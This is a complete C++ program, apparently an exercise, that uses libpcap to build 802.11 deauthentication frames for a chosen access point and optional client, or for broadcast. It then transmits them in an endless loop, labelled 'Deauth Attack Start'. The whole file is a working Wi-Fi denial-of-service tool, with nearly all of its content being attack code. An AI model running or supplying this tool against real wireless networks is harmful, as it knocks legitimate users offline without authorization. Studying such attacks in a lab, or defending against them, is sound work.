#include <iostream>
#include <format>
#include <pcap.h>
#include <string>
#include <unistd.h>
#include <iomanip> // std::setw와 std::setfill을 사용하기 위해 추가

using namespace std;

class MacAddress {
public:
    uint8_t mac[6];

    MacAddress(){
        for(int i = 0; i < 6; i++){
            mac[i] = 0xff;
        }
    }

    MacAddress(const uint8_t* addr) {
        for (int i = 0; i < 6; ++i) {
            mac[i] = addr[i];
        }
    }

    MacAddress(string addr) {
        sscanf(addr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
            &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    }

    MacAddress(char* addr) {
        sscanf(addr, "%02x:%02x:%02x:%02x:%02x:%02x",
            &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    }
    
    bool operator<(const MacAddress& other) const {
        for (int i = 0; i < 6; ++i) {
            if (mac[i] < other.mac[i]) return true;
            if (mac[i] > other.mac[i]) return false;
        }
        return false;
    }
    
};

class Radiotap_Header{
public:
    uint8_t version     = 0x00;
    uint8_t pad         = 0x00;
    uint16_t len        = 12;
    uint64_t present    = 0x00008004;
    uint16_t rate        = 0x02;
    uint16_t flags      = 0x0018;

    Radiotap_Header(){
        
    }

    uint8_t* get_frame(){
        uint8_t* frame = new uint8_t[12];
        frame[0] = version;
        frame[1] = pad;
        frame[2] = len & 0xff;
        frame[3] = len >> 8;
        frame[4] = present & 0xff;
        frame[5] = present >> 8;
        frame[6] = present >> 16;
        frame[7] = present >> 24;
        frame[8] = rate & 0xff;
        frame[9] = rate >> 8;
        frame[10] = flags & 0xff;
        frame[11] = flags >> 8;
        return frame;
    }
};

class Wireless_Management_Header{
public:
    uint16_t fixed_param = 0x0007;
    Wireless_Management_Header(){
        
    }
    uint8_t* get_frame(){
        uint8_t* frame = new uint8_t[2];
        frame[0] = fixed_param & 0xff;
        frame[1] = fixed_param >> 8;
        return frame;
    }
};


class Deauth_Frame {
public:
    uint16_t fc           = 0x00c0; // Type: Management, Subtype: Deauthentication
    uint16_t duration     = 0x013a;
    MacAddress addr_dest;
    MacAddress addr_src;
    MacAddress addr_bssid;
    uint8_t frag_seq[2]   = {0x00, 0x00}; // 0b 0000 0000 0000 0000

    Deauth_Frame() {}

    Deauth_Frame(MacAddress addr_dest, MacAddress addr_src, MacAddress addr_bssid) {
        this->addr_dest = addr_dest;
        this->addr_src = addr_src;
        this->addr_bssid = addr_bssid;
    }

    uint8_t* get_frame() {
        uint8_t* frame = new uint8_t[24];
        frame[0] = fc & 0xff;
        frame[1] = (fc >> 8) & 0xff;
        frame[2] = duration & 0xff;
        frame[3] = (duration >> 8) & 0xff;
        for (int i = 0; i < 6; i++) {
            frame[4 + i] = addr_dest.mac[i];
        }
        for (int i = 0; i < 6; i++) {
            frame[10 + i] = addr_src.mac[i];
        }
        for (int i = 0; i < 6; i++) {
            frame[16 + i] = addr_bssid.mac[i];
        }
        frame[22] = frag_seq[0];
        frame[23] = frag_seq[1];
        return frame;
    }
};

void parse_mac(const char* str, uint8_t* mac) {
    for (int i = 0; i < 6; ++i) {
        mac[i] = static_cast<uint8_t>(strtol(str + 3 * i, nullptr, 16));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 4) {
        cerr << "Usage: " << argv[0] << " <interface> <ap mac> [<station mac>]" << endl;
        cerr << "Sample: " << argv[0] << " mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
        return 1;
    }

    string interface = argv[1];
    uint8_t ap_mac[6];
    uint8_t station_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // Default to broadcast

    parse_mac(argv[2], ap_mac);
    if (argc == 4) {
        parse_mac(argv[3], station_mac);
    }

    MacAddress src(ap_mac);
    MacAddress bssid(ap_mac);
    MacAddress dest(station_mac);

    uint8_t* radiotap_frame = Radiotap_Header().get_frame();
    uint8_t* deauth_frame = Deauth_Frame(dest, src, bssid).get_frame();
    uint8_t* wireless_management_frame = Wireless_Management_Header().get_frame();

    uint8_t* frame = new uint8_t[38];
    for (int i = 0; i < 12; i++) {
        frame[i] = radiotap_frame[i];
        cout << hex << setw(2) << setfill('0') << static_cast<int>(frame[i]) << " ";
    }
    cout << endl;
    delete[] radiotap_frame;

    for (int i = 12; i < 12 + 24; i++) {
        frame[i] = deauth_frame[i - 12];
        cout << hex << setw(2) << setfill('0') << static_cast<int>(frame[i]) << " ";
    }
    cout << endl;
    delete[] deauth_frame;

    for (int i = 36; i < 38; i++) {
        frame[i] = wireless_management_frame[i - 36];
        cout << hex << setw(2) << setfill('0') << static_cast<int>(frame[i]) << " ";
    }
    cout << endl;
    delete[] wireless_management_frame;

    for (int i = 0; i < 38; i++) {
        cout << hex << setw(2) << setfill('0') << static_cast<int>(frame[i]) << " ";
        if (i % 8 == 7) cout << endl;
    }
    cout << endl;
    cout << "Deauth Attack Start" << endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        cerr << "Couldn't open device " << interface << ": " << errbuf << endl;
        return -1;
    }
    while (true) {
        if (pcap_sendpacket(handle, frame, 38) != 0) {
            cerr << "Error sending the packet: " << pcap_geterr(handle) << endl;
            return -1;
        }
        usleep(100000); // 0.1초 동안 sleep
    }
    pcap_close(handle);
    cout << "Deauth Attack Finished" << endl;
    return 0;
}